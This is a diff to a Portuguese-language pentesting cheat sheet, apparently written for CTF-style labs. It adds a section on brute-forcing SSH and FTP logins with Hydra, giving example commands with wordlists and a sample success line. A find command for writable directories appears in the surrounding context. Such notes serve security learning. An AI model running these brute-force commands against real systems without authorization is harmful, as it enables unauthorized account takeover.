@@ -181,7 +181,27 @@ find / -writable -type d 2>/dev/null
 
 ---
 
-## 7. Identificação e Quebra de Hash
+## 7. Força bruta de login (Hydra)
+
+Quando há um serviço de login exposto (SSH, FTP, HTTP) e já se tem um **usuário** (ex.: vazado num arquivo) + uma **lista de senhas** (wordlist), força-se o acesso com o **hydra**.
+
+```bash
+# SSH — usuário conhecido (-l) + wordlist de senhas (-P)
+hydra -l lin -P locks.txt ssh://<TARGET_IP>
+
+# FTP
+hydra -l <user> -P locks.txt ftp://<TARGET_IP>
+
+# lista de usuários (-L) + lista de senhas (-P)
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+```
+- `-l` = um usuário  |  `-L` = arquivo com vários usuários
+- `-p` = uma senha   |  `-P` = arquivo de senhas (wordlist)
+- Saída de sucesso: `[22][ssh] host: <IP>  login: lin  password: <SENHA>`
+
+---
+
+## 8. Identificação e Quebra de Hash
 
 ### Identificar o tipo de hash
 Ferramentas locais (Kali):
